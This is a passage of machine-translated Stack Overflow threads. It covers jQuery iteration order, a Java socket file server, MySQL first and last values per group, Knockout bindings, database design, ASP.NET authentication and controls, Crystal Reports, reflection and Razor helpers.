```
<ol>
    <li>The seventh</li>
    <li>8th</li>
    <li>(10-1)</li>
    <li>One</li>
    <li>2</li>
    <li>Trois</li>
</ol>
<ol>
    <li>Fourth</li>
    <li>5</li>
    <li>Number six</li>
</ol>​ 
```

和 JavaScript 代码...

```
$("li").each(function() {
    alert($(this).text());
});​ 
```

如何[**偏移**](http://en.wikipedia.org/wiki/Offset_%28computer_science%29)迭代顺序，使其从 element 开始`<li>One</li>`并在 element 结束`<li>(10-1)</li>`？

[jsfiddle 上提供的代码示例](http://jsfiddle.net/QwwQ7/)。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T16:50:51.990

对于您的情况，也许没有比这更好的了：

```
$.each(["one", "two", "three", "four", "five", ...], function(i, v) {
    var $this = $("li." + v);
    // ...
});​ 
```

**演示：http:** [//jsfiddle.net/ZapyJ/2/](http://jsfiddle.net/ZapyJ/2/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-19T16:51:01.250

你不能合理地期望 JavaScript 在没有大量额外工作的情况下智能地按数字顺序对英语数字进行排序。最好添加`data-`具有数字顺序的属性，然后通过简单的`for`循环提取这些属性。

HTML：

```
<ol>
    <li data-num="4">Four</li>
    <li data-num="5">Five</li>
    <li data-num="1">One</li>
    <li data-num="2">Two</li>
    <li data-num="3">Three</li>
</ol>
​ 
```

JS：

```
var max = $('li').length;
for (var i=1; i<max; i++) {
    var txt = $('li[data-num='+i+']').text();
    alert(txt);
};​ 
```

[http://jsfiddle.net/mblase75/ZapyJ/1/](http://jsfiddle.net/mblase75/ZapyJ/1/)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-19T16:52:32.213

```
var arr = ['one', 'two', 'three', 'four', 'five']
$("li").sort(function(a, b) {
    return arr.indexOf(a.className) > arr.indexOf(b.className)
}).each(function() {
    console.log(this.className)
}); 
```

[http://jsfiddle.net/r55BY/](http://jsfiddle.net/r55BY/)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-12-19T16:52:53.663

添加一个`sortOrder`数组，并调用`.sort()`：

```
var sortOrder = ['one','two','three','four','five'];

$("li").sort(function(a,b){ 
          return sortOrder.indexOf($(a).attr('class')) 
             - sortOrder.indexOf($(b).attr('class')); })
       .each(function() {
          alert($(this).attr("class"));
       }); 
```

现场示例：http: [//jsfiddle.net/XatzB/](http://jsfiddle.net/XatzB/)

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-12-19T17:36:07.833

干得好：

```
var $list = $("li");
​    
for (var i=2, l = $list.length, len = l + 2; i < len; i++) {
    alert($list.eq(i % l).attr('class'));
}​ 
```

在 jQuery 中重新排序集合并没有真正的好方法，但是您可以使用集合长度和偏移量来生成任意循环。我将把它作为练习留给读者动态计算起始索引，我假设你需要这样做。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-12-19T17:29:30.307

只需使用普通的 JavaScript 循环：

```
var $query = $("li");

var count = $query.length;
var offset = 2;
for(var i=0; i<count; i++) {
    var domEl = $query.get((i + offset)%count);
    //alert(domEl.getAttribute("class"));
    alert($(domEl).attr("class"));
} 
```

[JsFiddle 上的代码](http://jsfiddle.net/whcLA/)。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-19T17:05:48.510

不要使用诸如“一”、“二”和“三”之类的类将自己描绘成一个角落。相反，自动生成一个可排序的属性值，如`data-order`，它将以数字作为值：

```
<li data-order=7>Seven</li>
<li data-order=8>Eight</li>
<li data-order=1>One</li> 
```

通过使用`data-order`属性（随便命名），我们可以轻松地对集合中的这些项目进行排序，然后以它们的自然顺序迭代地修改它们：

```
$('li[data-order]').sort(sortByData).text(changeText);

function sortByData (one, two) {
    return $(one).data("order") - $(two).data("order");
}

function changeText (index, value) {
   return index + " " + value; 
} 
```

演示： http: [//jsfiddle.net/2MYJ3/1/](http://jsfiddle.net/2MYJ3/1/) ​</p>

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-01-30T22:28:31.310

您可以创建自己的方法，这就是我的做法（我花了很长时间才弄清楚）

```
$.fn.offsetEach = function(offset, cb) {
  $(this.get().splice(offset).concat(this.get().splice(0,offset))).each(cb);
} 
```

它的工作原理与 jQuery 的`each()`方法完全一样，除了添加了 offset 参数

```
$("li").offsetEach(integer_offset, function(index, element) {
     // iterates through all elements, but starts with an offset index
}); 
```

偏移量是从零开始的，因此对于您的示例，您可以这样开始`One`

```
$("li").offsetEach(3, function() {
     alert( $(this).text() );
}); 
```

[**小提琴**](http://jsfiddle.net/QwwQ7/2/)

# java - 服务器从客户端接受文件名

> ID：13957075
> 
> 赞同：1
> 
> 时间：2012-12-19T16:45:14.160
> 
> 标签：java

服务器部分将目录中可用文件的列表发送给客户端，客户端选择其中之一，然后客户端的请求发送到服务器，然后服务器将文件发送给客户端。我的服务器有问题，我不知道如何接受客户端请求的文件名，也许有人有想法？

服务器部分：

```
import java.io.*;
import java.net.*;
public class Server {
public static void main(String[] args) throws IOException {
    ServerSocket ss = null;
    try {
        ss = new ServerSocket(9999);
    } catch(IOException e) {
        e.getStackTrace();
    }
    while(true) {
        try {
            Socket s = ss.accept();
            System.out.println("Connection: " +s);
            PrintWriter out = new PrintWriter(s.getOutputStream(), true);
            BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
            String fileName = getFileName("E://share//");
            //sending available files names to client
            out.println(fileName);
            out.close();
            //System.out.println("File requested from client:");
            //String file = in.readLine();
            //System.out.println(file);
            s.close();
        } catch(IOException e) {
            e.printStackTrace();
        } 
        //ss.close();
    }
}//methode which get file names from directory
public static String getFileName(String folderName) {
    File folder = new File(folderName);
    File[] listOfFiles = folder.listFiles();
    StringBuffer sb = new StringBuffer();
    for(int i=0; i<listOfFiles.length; i++) {
       //System.out.println(listOfFiles[i].getName());
       sb.append(listOfFiles[i].getName()+"\n");
       }
    return sb.toString();
}
} 
```

客户端部分：

```
import java.io.*;
import java.net.*;
public class Client {
public static void main(String[] args) {
try {
    Socket s = new Socket(InetAddress.getLocalHost(),9999);
    BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
    //for gettin file name from available
    PrintWriter out = new PrintWriter(s.getOutputStream(), true);
    BufferedReader sin = new BufferedReader(new InputStreamReader(System.in));
    //output from server, available file list
    String fileNames;
    while((fileNames = br.readLine()) != null) {
        System.out.println(fileNames);
    }
    br.close();
 //imputing file name which have to be send from server to client
    System.out.println("Which file do you want to send:");
    String fileName = sin.readLine();
    out.println(fileName);
    out.close();
    s.close();
} catch(IOException e) {
    e.printStackTrace();
}

}
} 
```

# tfs - 如何在 TFS 构建中找出哪些项目构建错误源自？

> ID：13957078
> 
> 赞同：1
> 
> 时间：2012-12-19T16:45:15.343
> 
> 标签：tfs, tfsbuild

我可能在这里遗漏了一些东西，但是如果构建失败 - 我在摘要或日志中看不到任何地方，其中概述了错误（和警告）源自哪个项目。

例如，我们有一个包含大约 15 个项目的解决方案。最近，我们开始收到以下构建错误：“Controllers\ProfileController.cs (10): The type or namespace name 'Models' does not exist in the namespace 'XXX' ”。我看不到任何提及错误源自的项目，这导致我浪费时间，因为我花时间检查一个项目中的引用，却没有意识到我们有第二个项目与同名的控制器。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T17:03:17.657

TFS 构建输出在构建输出顶部附近有一个标记为“查看日志文件”的链接。这是您在 Visual Studio 输出窗口中习惯使用的完整 MSBuild 输出。您将能够从该日志文件中获取所需的详细信息。

# mysql - 选择组中的第一个和最后一个值

> ID：13957082
> 
> 赞同：30
> 
> 时间：2012-12-19T16:45:22.397
> 
> 标签：mysql, select, group-by

我有一个 MySql 表，其中包含每日股票报价（开盘价、最高价、最低价、收盘价和成交量），我试图将其动态转换为每周数据。到目前为止，我有以下函数，它适用于高点、低点和音量：

```
SELECT MIN(_low), MAX(_high), AVG(_volume),
CONCAT(YEAR(_date), "-", WEEK(_date)) AS myweek
FROM mystockdata
GROUP BY myweek
ORDER BY _date; 
```

我需要在上述查询中选择 _open 的第一个实例。因此，例如，如果星期一（在特定的一周内）有假期并且股票市场在星期二开市，则 _open 值应该从分组到其周的星期二中选择。同样，收盘价应该是该周的最后一个 _close。

是否可以在 MySql 中选择类似 FIRST() 和 LAST() 的内容，以便将上述内容包含在单个 SELECT 中，而不是使用嵌套的选择查询？

这是我的表的创建语句，以了解架构：

```
delimiter $$
CREATE TABLE `mystockdata` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `symbol_id` int(11) NOT NULL,
  `_open` decimal(11,2) NOT NULL,
  `_high` decimal(11,2) NOT NULL,
  `_low` decimal(11,2) NOT NULL,
  `_close` decimal(11,2) NOT NULL,
  `_volume` bigint(20) NOT NULL,
  `add_date` date NOT NULL,
  PRIMARY KEY (`id`),
  KEY `Symbol_Id` (`symbol_id`,`add_date`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8$$ 
```

更新：没有空值，只要有假期/周末，该表不包含该日期的任何记录。

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2012-12-19T16:54:05.240

如果您使用的是 MySQL 8，最好的解决方案是使用现在可用的窗口函数[FIRST_VALUE()](https://dev.mysql.com/doc/refman/8.0/en/window-function-descriptions.html#function_first-value)和/或[LAST_VALUE() 。](https://dev.mysql.com/doc/refman/8.0/en/window-function-descriptions.html#function_last-value)请看一下[Lukas Eder 的回答](https://stackoverflow.com/a/52412604/833073)。

但如果您使用的是旧版本的 MySQL，则不支持这些功能。您必须使用某种变通方法来模拟它们，例如，您可以使用聚合字符串函数[GROUP_CONCAT()](https://dev.mysql.com/doc/refman/8.0/en/group-by-functions.html#function_group-concat)创建一组按for和for排序的一周的所有值`_open`和值，并提取第一个元素放：`_close``_date``_open``_date desc``_close`

```
select
  min(_low),
  max(_high),
  avg(_volume),
  concat(year(_date), "-", lpad(week(_date), 2, '0')) AS myweek,
  substring_index(group_concat(cast(_open as CHAR) order by _date), ',', 1 ) as first_open,
  substring_index(group_concat(cast(_close as CHAR) order by _date desc), ',', 1 ) as last_close
from
  mystockdata
group by
  myweek
order by
  myweek
; 
```

`LIMIT 1`另一种解决方案是在`SELECT`子句中使用子查询：

```
select
  min(_low),
  max(_high),
  avg(_volume),
  concat(year(_date), "-", lpad(week(_date), 2, '0')) AS myweek,
  (
    select _open
    from mystockdata m
    where concat(year(_date), "-", lpad(week(_date), 2, '0'))=myweek
    order by _date
    LIMIT 1
  ) as first_open,
  (
    select _close
    from mystockdata m
    where concat(year(_date), "-", lpad(week(_date), 2, '0'))=myweek
    order by _date desc
    LIMIT 1
  ) as last_close
from
  mystockdata
group by
  myweek
order by
  myweek
; 
```

请注意，我将[LPAD()](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_lpad)字符串函数添加到`myweek`，以使周数始终为两位数，否则将无法正确排序周数。

将 substring_index 与 group_concat() 结合使用时也要小心：如果分组字符串之一包含逗号，则该函数可能不会返回预期结果。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2018-09-19T19:00:45.143

从 MySQL 8 开始，您最好使用[窗口函数](https://blog.jooq.org/2013/11/03/probably-the-coolest-sql-feature-window-functions/)来完成任务：

```
WITH 
  t1 AS (
    SELECT _low, _high, _volume, CONCAT(YEAR(_date), "-", WEEK(_date)) AS myweek
    FROM mystockdata
  ),
  t2 AS (
    SELECT 
      t1.*, 
      FIRST_VALUE(_open) OVER (PARTITION BY myweek ORDER BY _date) AS first_open,
      FIRST_VALUE(_close) OVER (PARTITION BY myweek ORDER BY _date DESC) AS last_close
    FROM t1
  )
SELECT MIN(_low), MAX(_high), AVG(_volume), myweek, MIN(first_open), MAX(last_close)
FROM t2
GROUP BY myweek
ORDER BY myweek; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-12-19T16:51:25.690

您可能需要发挥`COALESCE`作用才能获得第一个值。但是，您需要确保没有数据的日子（周末和节假日）`_open`在没有数据的日子里具有空值。

用法是：

```
SELECT MIN(_low), MAX(_high), AVG(_volume), COALESCE(_open)
CONCAT(YEAR(_date), "-", WEEK(_date)) AS myweek
FROM mystockdata
GROUP BY myweek
ORDER BY _date; 
```

对于 last() 值，我只能想到一个非常 hacky 的解决方案，即使用`GROUP_CONCAT`然后字符串操作从列表中获取最后一个值。所以也许是这样的：

```
SELECT MIN(_low), MAX(_high), AVG(_volume), COALESCE(_open), SUBSTRING_INDEX(GROUP_CONCAT(_close), ',', -1)
CONCAT(YEAR(_date), "-", WEEK(_date)) AS myweek
FROM mystockdata
GROUP BY myweek
ORDER BY _date; 
```

请注意，如果您想要外观一致的查询，您也可以`GROUP_CONCAT`对第一项使用该方法而不是 coalesce

```
SELECT MIN(_low), MAX(_high), AVG(_volume), SUBSTRING_INDEX(GROUP_CONCAT(_open), ',', 1), SUBSTRING_INDEX(GROUP_CONCAT(_close), ',', -1)
CONCAT(YEAR(_date), "-", WEEK(_date)) AS myweek
FROM mystockdata
GROUP BY myweek
ORDER BY _date; 
```

为了`GROUP_CONCAT`正常工作，您还需要确保没有值的日期在`_open`和`_close`字段中具有空值。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2015-05-21T22:17:51.630

基本上，你需要做的：

1.  按 PRODUCTID 分组
2.  在每个组内，按 LOCATION 排序
3.  选择与 LOCATION 订购的相同产品的第一个价格

将它们放在一起，您可以使用以下查询：

```
SELECT PRODUCTID, 
   SUBSTRING_INDEX(GROUP_CONCAT(CAST(LOCATION AS CHAR) ORDER BY LOCATION DESC), ',', 1) AS LOCATION,
   SUBSTRING_INDEX(GROUP_CONCAT(CAST(PRICE AS CHAR) ORDER BY LOCATION DESC), ',', 1) AS PRICE
FROM ProductLocation
GROUP BY PRODUCTID; 
```

请注意，MySQL 没有 GROUP BY 的 FIRST() 和 LAST() 聚合函数，但可以使用 GROUP_CONCAT() 和 SUBSTRING_INDEX() 函数模拟这种 FIRST() 和 LAST()。

# knockout.js - 使用选择元素作为编辑器绑定到 knockoutjs 中的整数数组

> ID：13957085
> 
> 赞同：0
> 
> 时间：2012-12-19T16:45:41.930
> 
> 标签：knockout.js, knockout-2.0

我正在使用 KnockoutJs 2.2。我有一个可以有零对多类别关联的记录。但是，我发现 KnockoutJs 实际上并没有将值绑定到记录的类别数组中的项目。

类别数组是 {id, name} 对象。这是从查找列表中得出的。

```
self.categories = ko.observableArray([{id:1,name:'Test1'},{id:2,name:'Test2'}]); 
```

在我的视图模型上，我有一个记录对象。该对象的字段之一是类别（observableArray）。

```
categories: ko.observableArray([]) 
```

为了在绑定中简洁起见，记录对象在视图模型上称为“r”。

```
<div class="yui3-u-4-5">
    <!-- ko foreach: r.categories-->
    <select data-bind="options: $parent.categories, optionsCaption:'-', 
optionsValue:'id', optionsText:'name', value:$data" />
    <div class="del" data-bind="click: $parent.removeCat" />
    <br />
    <!-- /ko -->
    <button data-bind="click: addCat">Add category</button>
</div> 
```

当用户添加或删除类别时，会调用以下代码：

```
self.removeCat = function (data) {
    self.r.categories.remove(data);
};

self.addCat = function () {
    self.r.categories.push(ko.observable(null));
} 
```

基本上，当一个类别被添加到 self.r.categories 数组中，然后你从下拉列表中选择一个类别时，所选项目的值不会绑定到数组中的 observable ($data)。数组值保持为空。

我在这里重新创建了问题：http: [//jsfiddle.net/fxXsq/](http://jsfiddle.net/fxXsq/)

也许我应该以另一种方式这样做？

谢谢你的帮助克里斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:07:06.967

您不应该像这样向您的可观察数组添加实际的新空可观察对象。

```
self.addCat = function () {
    self.r.categories.push(ko.observable(null)); 
} 
```

此外，如果您希望对象的 Id 和 Name 属性是可观察的，则需要为它们创建模型

```
self.addCat = function () {
    self.r.categories.push(new Category(null, self));
};

function Category(data, parent) {
   var self = this; 
   self.Id = ko.observable(-1);
   self.Name = ko.observable('');

   self.load = function(data) {
       if (data) {
           self.Id(data.Id);
           self.Name(data.Name);
       }
   }
   self.load(data);
} 
```

这是我应用于所有模型的通用模板，以更好地支持延迟绑定和灵活性。

现在您将拥有一个`observableArray r`包含`Category`具有可观察属性的对象。

# database - 将需求转换为关系模型的数据库设计决策

> ID：13957086
> 
> 赞同：0
> 
> 时间：2012-12-19T16:45:44.170
> 
> 标签：database, models, relational

所以我自愿为我当地教会的教育事工创建一个注册系统。它应该能够注册新学生并跟踪他们的进度。以下是我设法收集的要求：

> 1.  该教育机构提供多种课程。
>     
>     
> 2.  课程有名称和描述。
>     
>     
> 3.  课程按级别组织。每个级别有几门课程。
>     
>     
> 4.  课程也有要求（即需要先修读的其他课程）。
>     
>     
> 5.  学生通过该级别的所有课程后从该级别毕业。
>     
>     
> 6.  如果学生不能通过一门课程，他可以根据需要重复多次。
>     
>     
> 7.  学生每学期只能选修一门课程。
>     
>     
> 8.  不活跃的学生是指没有在当前学期注册的学生。
>     
>     
> 9.  教师每学期只教授一门课程。教师可以每学期教授不同的课程。
>     
>     
> 10.  可能有老师不教的学期。

现在，这是我的关系模型。

![https://dl.dropbox.com/u/10900918/rmodels.jpg][1]

我的问题是：

1.  是否缺少任何表？

2.  查看学期+学期代码描述：这是最好的方法吗？假设一年有 2 个学期，并且每个学期都有相同的开始和结束月份（即第 1 学期：8 月 - 12 月，第 2 学期：1 月 - 5 月），semester_code_description 表真的有必要吗？

3.  我该如何改进设计？

对不起，我没有包括任何箭头。我正在使用的程序是一团糟。

非常感谢您提前抽出宝贵时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T03:20:40.507

1）你的设计做得很好。我没有看到任何缺失的表格 - 看起来您满足了所有要求。

2）term_description 表对我来说很有意义，你是否需要它取决于你是否打算对这些数据做任何事情。

3）“学生每学期只能选修一门课程”的要求意味着Has_Taken关系的主键应该是（student_id，term_id）。就目前而言，我可以为同一个学生和学期插入两门不同的课程。Has_Teached 关系也是如此。

其他一些想法：

某些表中的“last_whatever”列将强制对您的实际应用程序进行一些额外的处理。您将需要一些机制来监控/更新这些。另一种选择是从您的表中派生它们。我可以通过查找具有最大年份/代码的学期来获得学生的 last_semester。

最后一个考虑因素，这些课程/描述/级别的稳定性如何？我在一所大学工作了几年，我们的课程会每学期更改一次，这迫使我们为每次更改保存完整的课程记录副本，因为我们希望学生的记录能够反映他们当时实际学习的内容。

这是您的应用程序中的一个小示例。假设我从 1 级毕业。然后一年后，教会在 1 级上增加了一门新课程（课程 A）。我实际上是未毕业的 b/c 现在有我没有的 1 级课程（课程 A ）。

如果您的课程非常稳定，这对您来说可能并不重要。祝你好运！

# asp.net-mvc - WebApiController 和 HttpContext.Current.User 中的用户是否不同？

> ID：13957087
> 
> 赞同：2
> 
> 时间：2012-12-19T16:45:53.080
> 
> 标签：asp.net-mvc, authentication, asp.net-web-api, basic-authentication, iprincipal

在参考[了这篇文章后](http://stevescodingblog.co.uk/basic-authentication-with-asp-net-webapi/)，我为基本 Http Authentication 编写了一个属性，用于 web api。在属性类中，如果提供的凭据匹配，那么我将 HttpContext.Current.User 设置为

```
 HttpContext.Current.User = new GenericPrincipal(new ApiIdentity(apiUser), new string[] {});

base.OnActionExecuting(actionContext); 
```

但是，当我在我的 api 控制器中访问 User 时，它没有 apiUser 属性。

为什么会这样，设置身份然后在 api 控制器中访问它的正确方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-20T06:00:52.320

不-不幸的是，您必须同时设置两者。

Thread.CurrentPrincipal 和 HttpContext.User

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T19:16:24.767

在您的 ASP.NET Web API 应用程序中，您不应该依赖当前的`HttpContext`. 至于您的问题的答案，将主体设置`Thread.CurrentPrincipal`为您想要的：

```
Thread.CurrentPrincipal = new GenericPrincipal(new ApiIdentity(apiUser), new string[] {}); 
```

# asp.net - 添加到占位符的 ASP.NET 控件在添加后立即丢失值

> ID：13957088
> 
> 赞同：0
> 
> 时间：2012-12-19T16:45:53.710
> 
> 标签：asp.net, controls

在以下问题上工作超过 5 小时：

```
Private Sub ModulEdit_PreInit(sender As Object, e As EventArgs) Handles Me.PreInit

    Dim modulid As Integer = 1

    loadeditors(modulid)

End Sub

Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load

End Sub

Public Sub loadeditors(modulID As Integer)

    PlaceHolder1.Controls.Clear()

    Using dbContext As New EntitiesModel()
        Dim mps As List(Of ef.Modulparameter) = dbContext.Modulparameters.Where(Function(c) c.ModulID = modulID).ToList

        Dim mmid As Int16
        If EditMode.Checked = True Then
            mmid = RadComboBox3.SelectedValue
        End If

        Dim mp As ef.Modulparameter

        For Each mp In mps

            Dim lbl As New Label
            lbl.Text = "<BR>" & mp.Name & "<BR>"
            PlaceHolder1.Controls.Add(lbl)

            Select Case mp.Editor.Name

                Case "textbox1line"

                    Dim con As New TextBox
                    con.ID = mp.ID

                    If EditMode.Checked = True Then
                        Using dbContext2 As New EntitiesModel
                            Try
                                Dim mpa As ef.Menu_modul_paramvalue = dbContext2.Menu_modul_paramvalues.Where(Function(c) c.ModulparameterID = mp.ID And c.Menu_modulID = mmid).First
                                con.Text = mpa.Valuestring

                            Catch ex As Exception
                                con.Text = "AAAA"
                            End Try

                        End Using
                    End If

                    PlaceHolder1.Controls.Add(con)
                    'RadAjaxManagerProxy1.AjaxSettings.AddAjaxSetting(Panel1, con, Nothing)
                    'RadAjaxManagerProxy1.AjaxSettings.AddAjaxSetting(con, con, Nothing)

                Case "radeditor"

                    Dim con As New RadEditor
                    con.ID = mp.ID
                    con.ToolsFile = "\admin\controls\ToolsFile.xml"
                    'con.CssFiles.Add("\Content\frenzy\css\frenzy-orange.css")
                    If EditMode.Checked = True Then
                        Using dbContext2 As New EntitiesModel
                            Try
                                Dim mpa As ef.Menu_modul_paramvalue = dbContext2.Menu_modul_paramvalues.Where(Function(c) c.ModulparameterID = mp.ID And c.Menu_modulID = mmid).First
                                con.Content = mpa.Valuestring

                            Catch ex As Exception
                                con.Content = "BBBB"
                            End Try

                        End Using
                    End If

                    PlaceHolder1.Controls.Add(con)
                    'RadAjaxManagerProxy1.AjaxSettings.AddAjaxSetting(Panel1, con, Nothing)
                    'RadAjaxManagerProxy1.AjaxSettings.AddAjaxSetting(con, con, Nothing)

            End Select

        Next

    End Using

End Sub 
```

我动态添加控件，在 pre_init 中调用上面的代码部分（在 load 和 init 中也尝试了相同的结果）控件的值（文本）在那里直到该行 PlaceHolder1.Controls.Add(con) 在 con.text 之后空的。

控件是在之后添加的，但没有任何值。奇怪的是，在同一个过程中，我添加了另一个控件（标签），其中文本值位于之后的页面上。

添加附加信息：在调试 LoadEditors 时，控件值（文本或内容）始终正确设置。但是然后在页面上（文本框和radeditor）都是空的路由是从预初始化调用的，如很多相关帖子中所述。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T16:54:58.253

您正在调用 ModulEdit_Init 中的加载程序。这不应该是 LoadControls 吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-20T11:16:44.410

我自己修好了：

*   在将控件添加到占位符之前添加“con.ViewStateMode = System.Web.UI.ViewStateMode.Disabled”
*   在 RadComboBox3 中也调用“loadeditors()”

问题很可能是，我在页面加载或初始化中加载了编辑器，它得到了正确的值，但随后调用了 RadComboBox3.SelectedIndexChanged 事件，它以某种方式覆盖了这些值

所以我的答案不是一个真正的答案，但它现在有效（我讨厌这样：它有效，但我不知道为什么）;）

# facebook-like - 喜欢插件按钮在喜欢时转动其标签以分享

> ID：13957090
> 
> 赞同：1
> 
> 时间：2012-12-19T16:45:59.300
> 
> 标签：facebook-like, facebook-likebox

该按钮有效，但是当我单击喜欢标签时，标签变为“共享”。这是我的按钮：

```
<div data-href="http://facebook.com/Fitnoss" data-send="false" data-layout="button_count" data-show-faces="false" class="fb-like"></div> 
```

这是我的 SDK 调用和初始化：

```
window.fbAsyncInit = function() {
  FB.init({
    appId: "XXXXXXXXXXXXXXX",
    channelUrl: "/fbc.html",
    cookie: true,
    logging: true,
    status: true,
    xfbml: true
  });
};

(function(d) {
  var js, id = 'facebook-jssdk', ref = d.getElementsByTagName('script')[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement('script'); js.id = id; js.async = true;
  js.src = "//connect.facebook.net/pt_BR/all.js";
  ref.parentNode.insertBefore(js, ref);
}(document)); 
```

我正在使用巴西葡萄牙语 SDK！

有谁知道或知道为什么会发生这种情况？

# c# - 水晶报表的 Linq 对象

> ID：13957092
> 
> 赞同：0
> 
> 时间：2012-12-19T16:46:08.973
> 
> 标签：c#, .net, crystal-reports, datasource

我有一个`List<Customer>`表中的 linq 对象。我想通过遍历此列表并将 PDF 写入磁盘来为每个客户生成一封信。

我想使用 Crystal Reports，在数据库专家中我选择了 .Net Objects 并选择我的`Linq.Customer`对象作为源。这按预期显示了我的所有字段，我可以很好地创建报告。

我收到异常“数据源无效”

这是我的代码

```
public void GenerateLetters(List<Customer> customers){

      foreach(Customer cust in customers){

             this.Generate(cust);

       }

} 
```

其中 Generate() 是：

```
public Generate(Customer cust){

            // this is the crystal reports letter
            Letter letter = new Letter();

            // set data source
            letter.SetDataSource(cust);    // exception thrown here

            // get the pdf stream
            pdfStream = (MemoryStream)letter.
                        ExportToStream(CrystalDecisions.Shared.ExportFormatType.PortableDocFormat);

            // copy to byte array
            fileBytes = pdfStream.ToArray();

            // clean up
            pdfStream.Close();
            letter.Dispose();

} 
```

我在设置数据源时遇到了异常，有人有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:24:54.460

我对 Crystal 不是很熟悉，但尝试将 a`List<Customer>`作为数据源传递：

```
letter.SetDataSource(new List<Customer>() { cust }); 
```

# c# - Activator.CreateInstance MissingMethodException

> ID：13957097
> 
> 赞同：2
> 
> 时间：2012-12-19T16:46:39.497
> 
> 标签：c#, .net, vb.net, reflection

我在 ac# dll 中有一个类，具有以下类

```
public class RequiredTask : Base.BaseObject
{

    public string Name { get; set; }
    public string Description { get; set; }

    public RequiredTask() 
        : base()
    { }

} 
```

从这个类继承

```
public class BaseObject : IBaseObject, INotifyPropertyChanged
{
    public DateTime? UpdatedOn { get; set; }
    public string UpdatedBy
    public DateTime? CreatedOn
    public string CreatedBy 

    public BaseObject() { }

} 
```

然后 UI 是一个 VB.Net Winform，这个表单将是一个基本表单并且是通用的，因此它可以与 c# 库中的所有类型一起使用，它有一个新按钮需要实例化新的类型无论 T 是什么，并将其传递给将用于编辑 T 的表单。

这是表单代码

```
Public Class Search(Of T As Library.Base.BaseObject)

        Private Sub btnNew_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNew.Click
            If MyBase.OpenFormName <> "" Then App.mfrmMDI.OpenForm(MyBase.OpenFormName, DirectCast(Activator.CreateInstance(GetType(T), New Object()), T))
        End Sub

End Class 
```

但是我在未找到“Library.Production.RequiredTask”类型时收到此错误构造函数。当它到达

```
DirectCast(Activator.CreateInstance(GetType(T), New Object()), T) 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-19T16:49:18.500

您收到异常是因为类型上没有匹配的构造函数，该构造函数采用 type 的单个参数`object`。

将调用更改为：

```
DirectCast(Activator.CreateInstance(GetType(T)), T) 
```

这应该会自动调用您定义的默认构造函数。

# c++ - 如何使用 Perl 风格的内存正则表达式与 Boost 库匹配

> ID：13957098
> 
> 赞同：3
> 
> 时间：2012-12-19T16:46:42.330
> 
> 标签：c++, regex, perl, boost, pattern-matching

我正在尝试使用 Perl 的正则表达式内存功能，它将匹配的文本放入变量 $1、$2 的 () 中...有谁知道我如何使用 Boost 来做到这一点，也许 Boost 将匹配的文本保存在不同的位置？以下代码行表示 $1 未定义。

```
 boost::regex ex( aaa(b+)aaa, boost::regex::perl );
 if(boost::regex_search( line ,ex ))
   set_value( $1 ); // Here $1 should contain all the b's matched in the parenthesis 
```

谢谢，乔

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T16:55:47.387

您将需要使用单独的重载`boost::regex_search`

特别是你想要一个传递`boost::match_results`结构的地方（通过引用）。只要搜索成功，它将使用子表达式（以及匹配的输入部分）填充。

```
boost::match_results<std::string::const_iterator> results;
std::string line = ...; 
boost::regex ex( "aaa(b+)aaa", boost::regex::perl );
 if(boost::regex_search( line ,results, ex ))
   set_value( results[1] ); 
```

# asp.net-mvc - 实用程序方法可以在 MVC razor 中返回原始 html

> ID：13957100
> 
> 赞同：8
> 
> 时间：2012-12-19T16:46:46.827
> 
> 标签：asp.net-mvc, html, razor

我正在尝试使用 autoplay='autoplay' 的 MVC razor 向页面输出一个值，以便自动播放 HTML5 视频。我的方法 GetAutoPlayVideo 读取 web.config 文件以确定站点是否会自动播放视频。

```
public static string GetAutoPlayVideo()
{
     bool autoPlayVideo = Converter.ToBoolean(System.Web.Configuration.WebConfigurationManager.AppSettings["AutoPlayVideo"]);
     if (autoPlayVideo)
     return "autoplay='autoplay'";
     else
         return string.Empty;
} 
```

然后在页面上使用以下标记：

```
 <div id="videoHolder">
                <video id="video" width="503" height="284" @Html.Raw(MyUtility.GetAutoPlayVideo()) controls >
                @foreach (string s in Model.SelectedShow.VideoFiles)
                {
                    <source src="@(CdnResources.GetImageUrl(s))" type="@(Utility.GetMimeType(s))" />
                }
                Your browser does not support the video tag.
            </video>
        </div> 
```

到目前为止我创建的语法是这样的：

```
@Html.Raw(MyUtility.GetAutoPlayVideo()) 
```

是否可以将其缩短为类似的东西？

```
@MyUtility.GetAutoPlayVideo() 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-19T16:49:49.877

是的。

Razor 逃逸系统不会逃逸任何类型的东西`IHtmlString`。该`Html.Raw()`方法只返回一个`HtmlString`包含您的文本的实例。

您可以简单地将您的方法声明为返回`IHtmlString`，然后调用`Html.Raw()`（或`new HtmlString()`在内部。

